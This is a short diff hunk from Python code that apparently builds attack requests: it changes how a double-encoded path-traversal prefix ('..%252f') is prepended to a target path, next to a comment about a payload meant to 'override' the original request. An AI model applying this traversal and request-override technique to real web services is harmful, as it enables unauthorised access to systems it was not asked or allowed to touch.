@@ -79,7 +79,7 @@ def get_external_ip():
 def prepare_request(method, url, data, headers, real_ip):
     purl = urlsplit(url)
     path = purl.path + ("?" + purl.query if purl.query else "")
-    path = "/account/signupredir/..%252f..%252f" + path.replace("/", "%2f")
+    path = "/account/signupredir/..%252f..%252f" + quote(path)
 
     # payload that'll "override" the original request
     payload = ""
